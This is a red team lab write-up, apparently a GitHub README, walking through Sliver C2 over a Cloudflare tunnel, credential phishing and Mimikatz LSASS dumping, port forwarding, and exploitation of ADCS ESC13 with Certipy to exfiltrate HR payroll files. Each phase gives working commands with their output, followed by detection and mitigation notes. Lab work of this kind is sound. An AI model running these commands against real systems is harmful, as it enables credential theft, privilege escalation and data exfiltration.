# Adversary Simulation: Abusing ADCS ESC13 (OID Misconfiguration) via Cloudflare-Tunneled Sliver C2

![Banner](https://github.com/user-attachments/assets/180d07d2-23e2-4c80-891d-65659bb1bcbd)

## 📖 Project Summary
This project aims to document a red team simulation lab, demonstrating the establishment of a Command & Control (C2) channel using Sliver C2, tunnelled through a custom Cloudflare HTTPS endpoint (`c2.testlab.best`). The scenario simulates post-exploitation TTPs, starting from an assumed initial access point as an "IT Support" user (`t.howard`). Active Directory enumeration led to the identification and exploitation of an ADCS ESC13 vulnerability ("Issuance Policy with Privileged Group Linked"). This allowed the "IT Support" user to gain effective membership of an "HR Remote Access" group, ultimately accessing sensitive HR data. 

TBD - A bonus phase demonstrated escalation to Domain Admin by abusing writable OID object permissions, leveraging a similar ADCS misconfiguration, and achieving persistence via a Golden Certificate. - TBD

## 📚 Table of Contents

- [Objectives & Learning Goals](#-objectives--learning-goals)
- [Lab Environment Overview](#-lab-environment-overview) 
- [Attack Narrative & Methodology](#%EF%B8%8F-attack-narrative--methodology) 
  - [Phase 1: Initial Access & C2 Establishment](#-phase-1--initial-access--c2-establishment) 
  - [Phase 2: Local Operations, Credential Access & Pivot Establishment on `LAB-WIN10`](#%EF%B8%8F-phase-2-local-operations-credential-access--pivot-establishment-on-lab-win10)
  - [Phase 3: Exploitation (Accessing HR Data)](#-phase-3-exploitation-accessing-hr-data) 
  - [Phase 4: Bonus - Domain Escalation & Persistence (TBD)](#-tbd---phase-4-bonus-domain-escalation--persistence---tbd)  
- [Scenario Scope & Limitations](#%EF%B8%8F-scenario-scope--limitations)
- [Key Learnings & Skills Demonstrated](#-key-learnings--skills-demonstrated) 
- [Further Reading & References](#-further-reading--references)

## 🎯 Objectives & Learning Goals
*   **Command and Control:** An introduction and hands-on experience setting up and operating `Sliver C2`.
*   **Egress Evasion & Tunneling:** Demonstrate the use of `Cloudflare` Tunnels with a custom domain to mask C2 traffic.
*   **Active Directory Enumeration:** Utilise tooling like `RustHound`, `NetExec` and `Certipy` to effectively map AD environments and identify misconfigurations.
*   **Privilege Escalation (ADCS ESC13):** Understand and exploit a specific ADCS ESC13 misconfiguration involving Issuance Policy OIDs and lingering enrollment rights.
*   **Targeted Attack Path:** Focus on a realistic attack objective (accessing sensitive HR data instead of immediate escalation to Domain Admin).
*   **Further AD Abuse:** (Bonus) Explore further escalation paths through OID object permission abuse and leverage persistence techniques (Golden Certificate).

## 💻 Lab Environment Overview
*   **Domain Controller VM:** Windows Server 2019 (`LAB-DC01`)
    *   Roles: Domain Controller, AD CS (Enterprise CA named `LAB-DC01-CA`)
*   **Victim Machine VM:** Windows 10 Enterprise (`LAB-WIN10`)
    *   Joined to `lab.local` domain.
    *   Initial access assumed as `lab\t.howard`.
*   **Attacker Machine:** Exegol Docker Container https://exegol.readthedocs.io/en/latest/index.html
    *   Hosts Sliver C2 Server.
    *   Hosts `cloudflared` client.
    *   Contains all attacker tools (RustHound, NXC, Certipy, etc.).
*   **Network:** VMWare NAT (Victim Internet access) + Host-only (Private network/LAN for DC & Victim)
    *   LAB-DC01: Host-only (No direct internet access)
    *   LAB-WIN10: NAT (Internet access for C2) & Host-only (Domain communication)
    *   Attacker/Exegol: Access via Tunnel
      
    ![Network Diagram](https://github.com/user-attachments/assets/c80fcf65-f399-4d11-ba76-017ee3482898)

## ⚔️ Attack Narrative & Methodology

### 🚀 Phase 1 : Initial Access & C2 Establishment
*   **Initial Access:** Assumed. A default Sliver HTTPS beacon was executed on `LAB-WIN10` in the context of `lab\t.howard`. Defender/AV was disabled for lab focus.
*   **C2 Infrastructure:**
    *   Sliver HTTPS listener configured and Implant generated:
        ![Sliver HTTPS Listener Setup and Implant Generation](https://github.com/user-attachments/assets/31230ccd-0f8f-4ab1-aaae-e0a3b288ed68)

    *   Cloudflare Tunnel (`cloudflared`) established on the Exegol container, mapping `https://c2.testlab.best` to the local Sliver listener (`https://localhost:443` from Exegol's perspective).
        ```bash
        cloudflared tunnel run --token <omitted>
        ```

    *   Session started.
         ```bash
         Session 7f623d24 ABSENT_PRESSROOM - tcp([::1]:53162)-><Victim Public IP> (LAB-WIN10) - windows/amd64 - Sun, 01 Jun 2025 04:34:15 BST
         ```
     
<details>
<summary><strong>My Thoughts & Observations (Phase 1)</strong></summary>

*   **Why Sliver & Cloudflare?** The choice of Sliver was driven by its modern features and ease of use. Antivirus evasion is not within the scope of the project, and its default Golang templates served my use case well. In future, I will thoroughly explore AV Evasion and effective methods of Implant/Beacon obfuscation, but for now that is not within the scope of this project. Cloudflare tunnelling was selected to simulate a common C2 evasion tactic: abusing trusted cloud provider infrastructure to bypass egress filtering and blend traffic. I also explored using mTLS (mutual TLS) and a redirector, common in actual engagements, but chose to simplify being able to reproduce my setup. I would absolutely like to explore the use of a QUIC-based beacon in the future, UDP:443 and its potential to evade common HTTPS inspection piques my interest. 
*   **Custom Domain Significance:** Using `c2.testlab.best` (a domain I own for lab work) URL adds a layer of realism, as attackers often use custom domains for their C2 infrastructure outside of the disposable trycloudflare.com tunnels they might use in staging. 
*   **Assumed Access:** As mentioned, this scenario begins with access assumed. With AV/EDR not in the scope of this project, my noisy Golang beacon has free rein. The following report by Proofpoint looks into how real threat actors would methodically leverage similar TTPs to deploy their malware: https://www.proofpoint.com/us/blog/threat-insight/threat-actor-abuses-cloudflare-tunnels-deliver-rats

</details>

<details>
<summary><strong>Mitigation & Detection Considerations (Phase 1)</strong></summary>

*   **C2 Tunneling via Cloudflare:**
    *   **Prevention:** Explore egress filtering that only allows traffic to known-good, categorised FQDNs. Use DPI/TLS inspection to identify non-standard HTTP/S traffic patterns. Mutual TLS (mTLS) is likely to break/evade this. I would test solutions by simulating this evasion, capturing logs/traffic and building detection logic around that.
    *   **Detection:**  Monitor for DNS queries to `*.trycloudflare.com` and correlate new or rarely seen FQDNs resolving to Cloudflare’s IP ranges. Sliver Sessions establish an open TCP connection back to the server, while Beacons can call back periodically and may sleep for hours until activated.  
*   **Sliver Beacon Execution:**
    *   **Prevention:** Application whitelisting, especially in user-writable paths. ASR rules and AMSI enforcement. Be aware of and harden against the swathe of Windows signed LOLBins attackers can leverage. Deploy EDR and maintain up-to-date detection logic.
    *   **Detection:** EDR alerts for suspicious process execution, memory injection, or network connections from strange parent/child process trees. Our default Sliver implant likely interacts with VirtualAlloc, WriteProcessMemory or CreateRemoteThread, which should set off alarm bells.
</details>

### 🕵️ Phase 2: Local Operations, Credential Access & Pivot Establishment on `LAB-WIN10`

With the initial session active as `t.howard`, the immediate objective is to understand the local environment. We want to obtain credentials and/or escalate privileges for broader domain interaction and establish pivots to allow tools on the back on our Exegol host to reach internal domain services.

*   **A. Initial Host Reconnaissance & Privilege Assessment (Sliver):**
    Basic situational awareness on `LAB-WIN10`.
    <details>
    <summary><code>sliver (ABSENT_PRESSROOM) > info</code> — Click to expand</summary>

    ```sliver
    Name: ABSENT_PRESSROOM
    Hostname: LAB-WIN10
    UUID: 67d24d56-604d-1c53-da47-68e224cbf9db
    Username: LAB\t.howard  # A quick highlight to the domain name
    UID: S-1-5-21-2722926128-310879818-2353593629-1120
    GID: S-1-5-21-2722926128-310879818-2353593629-513
    PID: 64
    OS: windows
    Version: 10 build 17763 x86_64
    Locale: en-GB
    Arch: amd64
    Active C2: https://c2.testlab.best:443 
    Remote Address: tcp([::1]:60772)-><Victim Public IP>
    Proxy URL:
    Reconnect Interval: 1m0s
    First Contact: Sun Jun  1 05:32:39 BST 2025 (1h15m43s ago)
    Last Checkin: Sun Jun  1 06:48:21 BST 2025 (1s ago)
    ```
    </details>
    
    ```sliver
    sliver (ABSENT_PRESSROOM) > whoami
    Logon ID: LAB\t.howard
    [*] Current Token ID: LAB\t.howard
    ```
    
    Key privilege found: `SeImpersonatePrivilege`.
    <details>
    <summary><code>sliver (ABSENT_PRESSROOM) > getprivs</code> — Click to expand</summary>

    ```sliver
    Privilege Information for ABSENT_PRESSROOM.exe (PID: 64)
    --------------------------------------------------------
    
    Process Integrity Level: Medium

    Name                            Description                             Attributes
    ====                            ===========                             ==========
    SeChangeNotifyPrivilege                         Bypass traverse checking                       Enabled, Enabled by Default
    SeImpersonatePrivilege                          Impersonate a client after authentication      Enabled, Enabled by Default # Interesting discovery
    SeCreateGlobalPrivilege                         Create global objects                          Enabled, Enabled by Default
    ```
    </details>
    
    <details>
    <summary><code>sliver (ABSENT_PRESSROOM) > ifconfig</code> — Click to expand</summary>

    ```sliver
    +---------------------------------------------+
    | Ethernet0                                   |
    +---------------------------------------------+
    |  # | IP Addresses       | MAC Address       |
    +----+--------------------+-------------------+
    | 10 | 192.168.247.129/24 | 00:0c:29:cb:f9:db |
    +---------------------------------------------+

    +--------------------------------------------+
    | Ethernet1                                  |
    +--------------------------------------------+
    |  # | IP Addresses      | MAC Address       |
    +----+-------------------+-------------------+
    | 15 | 192.168.81.129/24 | 00:0c:29:cb:f9:e5 |
    +--------------------------------------------+
    ```
    </details>
    
*   **B. Privilege Escalation & Credential Access:**

    To enumerate Active Directory in the vast majority of environments, we need valid credentials. Thus, our goal is to obtain them for `lab\t.howard` or escalate to SYSTEM for credential dumping.

    *   **Method 1: Ask for them!**
        By leveraging c2tc-askscreds from https://github.com/outflanknl/C2-Tool-Collection?tab=readme-ov-file we can simply prompt the user to enter their credentials.
        Sliver makes this easy to execute through their armory extensions:
        ```sliver
        sliver (ABSENT_PRESSROOM) > armory install c2-tool-collection
        sliver (ABSENT_PRESSROOM) > c2tc-askscreds
        ```
        This presents the victim with a nice window:
        
        ![Credential Prompt GUI](https://github.com/user-attachments/assets/cf4cf71c-462b-4e19-a3e2-41b9d560343d) 
        
        Success! 
        ```sliver
        [server] sliver (ABSENT_PRESSROOM) > c2tc-askcreds
        [*] Successfully executed c2tc-askcreds (coff-loader)
        [*] Got output:
        [+] Username: LAB\t.howard
        [+] Password: Summer2025
        ```
        Further enumeration with c2tc-domaininfo provides critical information for moving forward. Key details: Domain is `lab.local`, PDC is `\\LAB-DC01.lab.local` at `\\192.168.81.10`.
        <details>
        <summary><code>sliver (ABSENT_PRESSROOM) > c2tc-domaininfo</code> — Click to expand</summary>

        ```sliver
        [*] Successfully executed c2tc-domaininfo (coff-loader)
        [*] Got output:

        [+] DomainName:
            lab.local
        [+] DomainGuid:
            {DB630BFA-CB26-45E5-B230-4F9923E28106}
        [+] DnsForestName:
            lab.local
        [+] DcSiteName:
            Default-First-Site-Name
        [+] ClientSiteName:
            Default-First-Site-Name
        [+] DomainControllerName (PDC):
            \\LAB-DC01.lab.local
        [+] DomainControllerAddress (PDC):
            \\192.168.81.10  
        [+] NextDc DnsHostName:
            lab-dc01.lab.local
        ```
        </details>

    *   **Method 2: Dump them!**
        Using a much louder way, but with AD/EDR not in play, we can have some fun. A common fault among IT staff is that they often enjoy local admin privileges for convenience; this makes for easy pickings.
        We leverage the Mimikatz BOF extension and our confirmed `SeImpersonatePrivilege` to elevate to SYSTEM.
        <details>
        <summary><code>sliver (ABSENT_PRESSROOM) > mimikatz token::elevate</code> — Click to expand</summary>
        
        ```sliver
        mimikatz(commandline) # token::elevate
        Token Id  : 0
        User name :
        SID name  : NT AUTHORITY\SYSTEM

        556     {0;000003e7} 0 D 44956          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
        -> Impersonated !
        * Process Token : {0;01d47696} 3 F 31725093    LAB\t.howard    S-1-5-21-2722926128-310879818-2353593629-1120   (12g,24p)       Primary
        * Thread Token  : {0;000003e7} 0 D 31879099    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)
        ```
        </details>
        
        Confirm `SeDebugPrivilege`.
        ```sliver
        sliver (ABSENT_PRESSROOM) > mimikatz privilege::debug
        mimikatz(commandline) # privilege::debug
        Privilege '20' OK
        ```
        Inspect and parse LSASS. Credentials for `LAB\t.howard` (NTLM: `5f69...`) were obtained.
        <details>
        <summary><code>sliver (ABSENT_PRESSROOM) > mimikatz sekurlsa::logonpasswords</code> — Click to expand</summary>

        ```sliver
        mimikatz(commandline) # sekurlsa::logonpasswords

        Authentication Id : 0 ; 30701230 (00000000:01d476ae)
        Session           : Interactive from 3
        User Name         : t.howard
        Domain            : LAB
        Logon Server      : LAB-DC01
        Logon Time        : 01/06/2025 08:14:16
        SID               : S-1-5-21-2722926128-310879818-2353593629-1120
        msv :
         Primary
         * Username : t.howard
         * Domain   : LAB
         * NTLM     : 5f695056521900e992a6366aabb446a3
         * SHA1     : 8b18a23d3c272fb1f5e635c3f029fc88351a885e
         * DPAPI    : 5da66620315ba75a9e63de132374ac36  
        ```
        </details>
        This NTLM hash could then be cracked offline or simply used for pass-the-hash.

*   **C. Port Forwarding:**
    To allow tools on our Exegol container to communicate with `LAB-DC01` (at `192.168.81.10`), we forward the necessary ports.
    *   **LDAP 389:**
        ```sliver
        sliver (ABSENT_PRESSROOM) > portfwd add --bind 127.0.0.1:389 --remote 192.168.81.10:389
        [*] Port forwarding 127.0.0.1:389 -> 192.168.81.10:389
        ```
    *   **SMB 445:**
        ```sliver
        sliver (ABSENT_PRESSROOM) > portfwd add --bind 127.0.0.1:445 --remote 192.168.81.10:445
        [*] Port forwarding 127.0.0.1:445 -> 192.168.81.10:445
        ```
    *   **Kerberos 88:**
        ```sliver
        sliver (ABSENT_PRESSROOM) > portfwd add --bind 127.0.0.1:88 --remote 192.168.81.10:88
        [*] Port forwarding 127.0.0.1:88 -> 192.168.81.10:88
        ```
    
*   **D. Domain Enumeration:**
    With port forwards active, we target the local forwarded ports on Exegol.
    *   **NetExec (NXC):**
        Initial enumeration of users and shares. Discovery of a "HR" share.
        ![NXC SMB Enumeration Output](https://github.com/user-attachments/assets/dd2d9540-39c5-4b95-82e8-9862fec760c2) 
        Querying for ADCS using the LDAP module.
        ![NXC ADCS LDAP Query Output](https://github.com/user-attachments/assets/9797a22d-ea7a-4eca-919e-d2e82b707cc4) 
    *   **BloodyAD:**
        Quick view of our own attributes.
        ![BloodyAD User Attributes Output](https://github.com/user-attachments/assets/60a08488-0053-4639-ab48-80c4079bed94) 

    *   **RustHound:**
        Offline analysis of the domain. 
        ![RustHound Collector Output/GIF](https://github.com/user-attachments/assets/881d8e7e-2be3-415a-beab-00814e6e79b0) 
        Initial findings led to the discovery of a group (`Helpdesk`) delegated `ForceChangePassword` over several users.
        ![BloodHound ForceChangePassword Path GIF/Image](https://github.com/user-attachments/assets/5f1b9ab2-8035-4443-b254-5efc208dd8d0) 

    *   **Certipy:**
        Enumerating for vulnerable templates.
        ![Certipy Find Command GIF/Image](https://github.com/user-attachments/assets/923ac8c9-6254-4908-a351-ccfc4a8862d9) 
        Immediate discovery of a potentially exploitable ESC13 template (`HRRemoteAccess`).
        ![Certipy ESC13 Vulnerable Template Output](https://github.com/user-attachments/assets/07dbc91a-5df2-4fa9-858d-4934a516bc6f) 
   *   **Exploring ESC13:**
       Key components from the Certipy output for `HRRemoteAccess` template:
       ```text
       Extended Key Usage: Client Authentication # Allows the template to be used for network logon
       Issuance Policies : 1.3.6.1.4.1.311.21.8.14321096.730787.4278970.16068073.7715374.74.12681378.11722089 # OID linked via Issuance Policy
       Linked Groups     : CN=HR Access,OU=SecurityGroups,OU=CORPO,DC=lab,DC=local # Group linked to the OID
       Enrollment Rights : LAB.LOCAL\Helpdesk # Our current user (t.howard is in Helpdesk) can enroll
                           LAB.LOCAL\HR Members                      
       ```
       Reference: [Certipy Wiki - ESC13](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc13-issuance-policy-with-privileged-group-linked).
       > Fundamentally, the presence of the Linked Group and our ability to enrol give us functionally equivalent access rights as that group. 

<details>
<summary><strong>My Thoughts & Observations (Phase 2)</strong></summary>

*   **Methodical Progression:** This phase demonstrates a logical flow: understand the environment, gain necessary credentials/privileges, then establish pathways for deeper network penetration.
*   **Leveraging Sliver BOFs:** We leverage several built-in Sliver BOF extensions, showcasing different ways of using the Sliver C2 platform, without having to drop in external tools or writing to disk. 
*   **Port Forwarding:** Sliver's port forwards use in-band tunnels to transfer data between your local machine and the implant network; thus, it all goes through our Cloudflare tunnel! 
*   **Credential Goal:** Method 1 showcased an interesting method of capturing credentials; though rather obvious, combining it with a more refined trigger and social engineering could make it much more believable. 

</details>

<details>
<summary><strong>Mitigation & Detection Considerations (Phase 2)</strong></summary>

*   **Mimikatz BOF (Credential Dumping):**
    *   **Prevention:** Credential Guard, LSA Protection. Discourage giving out local admin rights.
    *   **Detection:** Access to LSASS process memory by non-standard processes. EDR detections for Mimikatz signatures/behaviors.
*   **Port Forwarding via C2:**
    *   **Detection:** Network monitoring for unusual internal traffic patterns originating from a single workstation to the DC, especially if that workstation isn't expected to perform such actions.
    
</details>

### 💥 Phase 3: Exploitation (Accessing HR Data)
*   **Certificate Request (Certipy):**
    As `t.howard`, request a certificate using the vulnerable `HRRemoteAccessTemplate`.
    ```bash
    [Jun 01, 2025 - 11:58:12 (BST)] exegol-lab1 /workspace # certipy req -u 't.howard' -p 'Summer2025' -dc-ip 127.0.0.1 -target 'LAB-DC01.lab.local' -ca 'LAB-DC01-CA' -template 'HRRemoteAccess'
    Certipy v5.0.2 - by Oliver Lyak (ly4k)
    [*] Requesting certificate via RPC
    [*] Request ID is 5
    [*] Successfully requested certificate
    [*] Got certificate with UPN 't.howard@lab.local'
    [*] Certificate object SID is 'S-1-5-21-2722926128-310879818-2353593629-1120'
    [*] Saving certificate and private key to 't.howard.pfx'
    [*] Wrote certificate and private key to 't.howard.pfx'
    ```
*   **Authentication with Certificate & Privilege Gain (Certipy):**
    The KDC, when processing authentication with this certificate, adds the SID of `HR Access` (linked via the Issuance Policy OID) to the TGT.
    ```bash
    certipy auth -pfx 't.howard.pfx' -dc-ip 127.0.0.1
    [*] Certificate identities:
    [*]     SAN UPN: 't.howard@lab.local'
    [*]     Security Extension SID: 'S-1-5-21-2722926128-310879818-2353593629-1120'
    [*] Using principal: 't.howard@lab.local'
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saving credential cache to 't.howard.ccache'
    [*] Wrote credential cache to 't.howard.ccache'
    [*] Trying to retrieve NT hash for 't.howard'
    [*] Got hash for 't.howard@lab.local': aad3b435b51404eeaad3b435b51404ee:5f695056521900e992a6366aabb446a3
    export KRB5CCNAME=t.howard.ccache #Export the .ccache to our klist.
    ```
    Leverage new privileges with Kerberos to list shares. The "HR" share is now accessible with READ,WRITE permissions.
    <details>
    <summary><code>nxc smb 127.0.0.1 --shares -k --use-kcache</code> — Click to expand</summary>

    ```bash
    nxc smb 127.0.0.1 -d lab.local --shares -k --use-kcache --kdcHost 127.0.0.1
    SMB         127.0.0.1       445    LAB-DC01         [*] Windows 10 / Server 2019 Build 17763 (name:LAB-DC01) (domain:lab.local) (signing:True) (SMBv1:False)
    SMB         127.0.0.1       445    LAB-DC01         [+] lab.local\t.howard from ccache
    SMB         127.0.0.1       445    LAB-DC01         [*] Enumerated shares
    SMB         127.0.0.1       445    LAB-DC01         Share           Permissions     Remark
    SMB         127.0.0.1       445    LAB-DC01         -----           -----------     ------
    SMB         127.0.0.1       445    LAB-DC01         ADMIN$                          Remote Admin
    SMB         127.0.0.1       445    LAB-DC01         C$                              Default share
    SMB         127.0.0.1       445    LAB-DC01         HR              READ,WRITE
    SMB         127.0.0.1       445    LAB-DC01         IPC$            READ            Remote IPC
    SMB         127.0.0.1       445    LAB-DC01         NETLOGON        READ            Logon server share
    SMB         127.0.0.1       445    LAB-DC01         SYSVOL          READ            Logon server share
    ```
    </details>
    
    Confirmed access to the HR share. Exfiltrating contents using NXC's `spider_plus` module.
    ![NXC Spider Plus Exfiltrating HR Share](https://github.com/user-attachments/assets/62c65338-1bf2-4f1c-9596-54090991c01e) 

*   **Accessing Sensitive Data (Listing Exfiltrated Files):**
    ```bash
    ls /root/.nxc/modules/nxc_spider_plus/127.0.0.1/HR -l
    total 32
    -rw-rw-r-- 1 root root 7488 Jun  1 12:25  Contracts.xlsx
    -rw-rw-r-- 1 root root 7488 Jun  1 12:25 'payroll 2024.xlsx'
    -rw-rw-r-- 1 root root 7488 Jun  1 12:25 'payroll 2025.xlsx'
    -rw-rw-r-- 1 root root 7488 Jun  1 12:25 'Single Central Record.xlsx'
    ```
<details>
<summary><strong>My Thoughts & Observations (Phase 3)</strong></summary>

*   **Exploitation Flow:** This demonstrates a clean execution of ESC13. The key is that the user `t.howard` enrolls for a certificate *as themselves*, but the OID embedded in the template grants them additional group SIDs in their Kerberos ticket upon authentication.
*   **Targeted Objective:** The goal here wasn't immediate DA, but accessing specific, sensitive data (`HR`), which mirrors a more common attacker objective in many real-world breaches.
*   **Scenario Crafting:** The ability to enrol in an "HR Remote Access" template as `Helpdesk` was meant to showcase a typical oversight in leftover permissions; it is implied that IT Support were given access to test this template historically.

</details>

<details>
<summary><strong>Mitigation & Detection Considerations (Phase 3)</strong></summary>

*   **Exploitation of ADCS ESC13:**
    *   **Prevention.**
        * Heavily scrutinise the usage of OID-Group Links, who can enrol, and the access they grant.
        * Like most ESC vulnerabilities, Manager Approval can be an effective method to manually review templates requested in this manner.

</details>

### 👑 TBD - Phase 4: (Bonus) Domain Escalation & Persistence - TBD
*   **Domain Admin Escalation via OID Object Modification:**
    *   **Discovery (Simulated):** As a bonus, I have purposely, post-exfil, added an escalation path to Domain Admin leveraging the same ESC13 vulnerability. While likely exceptionally rare outside of the most deranged domain admins, a writable OID object can lead to immediate escalation to DA.

        The following command queries the OID objects in `CN=OID,CN=Public Key Services,CN=Services,CN=Configuration`.
        ```bash
        certipy find -u t.howard@lab.local -p 'Summer2025' -dc-ip 127.0.0.1 -oids -ldap-scheme ldap
        ```
        The output highlights dangerous `WriteProperty` permissions for `LAB.LOCAL\Helpdesk` over the "HR Remote Access Enrollment" OID.
        <details>
        <summary><code>certipy find ... -oids</code> output for vulnerable OID — Click to expand</summary>

        ```text
        Issuance Policy Name                : 11722089.6A4AE10CA7257839311D287288D2DB0A
        Display Name                        : HR Remote Access Enrollment
        Certificate Template(s)             : HRRemoteAccess
        Linked Group                        : CN=HR Access,OU=SecurityGroups,OU=CORPO,DC=lab,DC=local
        Permissions
        Owner                               : LAB.LOCAL\Enterprise Admins
        Access Rights
          WriteProperty                     : LAB.LOCAL\Helpdesk
                                            LAB.LOCAL\Domain Admins
                                            LAB.LOCAL\Local System
                                            LAB.LOCAL\Enterprise Admins
          WriteDacl                         : LAB.LOCAL\Domain Admins
                                            LAB.LOCAL\Local System
                                            LAB.LOCAL\Enterprise Admins
          WriteOwner                        : LAB.LOCAL\Domain Admins
                                            LAB.LOCAL\Local System
                                            LAB.LOCAL\Enterprise Admins
        [+] User ACL Principals             : LAB.LOCAL\Helpdesk
        [!] Vulnerabilities
        ESC13                               : User has dangerous permissions.
        ```
        </details>
                
## ⚠️ Scenario Scope & Limitations
*   **Focus:** C2 communications, AD enumeration, targeted ADCS ESC13 exploitation, and advanced AD object abuse for privilege escalation & persistence.
*   **Out of Scope:**
    *   AV/EDR bypass techniques for payloads and on-host tools (Defender/AV disabled).
    *   Initial access vector development.
*   **Objective:** Simulate realistic, targeted data access followed by controlled escalation to DA, demonstrating layered attack paths and persistence.

## ✨ Key Learnings & Skills Demonstrated
*   **Practical C2 Setup & Usage:** Configured Sliver with Cloudflare Tunneling using a custom domain within a containerized environment (Exegol).
*   **In-depth ADCS Exploitation:** Identified and exploited a nuanced ADCS ESC13 misconfiguration based on Issuance Policy OIDs and access control lists.
*   **Advanced AD Object Abuse:** Demonstrated escalation by modifying critical AD CS configuration objects (OIDs).
*   **Systematic Enumeration & Attack Chaining:** Methodically enumerated the environment to find chained vulnerabilities leading to objectives.
*   **Persistence Techniques:** Implemented Golden Certificate creation for stealthy, long-term access.
*   **Red/Purple Team Mindset:** Documented both attack techniques and corresponding mitigation/detection strategies.
*   **Documentation & Reporting:** Clearly documented procedures, findings, and impact of the simulated attack.

## 🔗 Further Reading & References
*   Sliver C2 Documentation: https://sliver.sh/docs
*   Certipy Documentation: https://github.com/ly4k/Certipy/wiki
*   Cloudflare Tunnel Documentation: https://developers.cloudflare.com/cloudflare-one/faq/cloudflare-tunnels-faq/#how-can-i-troubleshoot-a-tunnel-that-was-configured-from-the-zero-trust-dashboard
*   Exegol: https://exegol.readthedocs.io/en/latest/
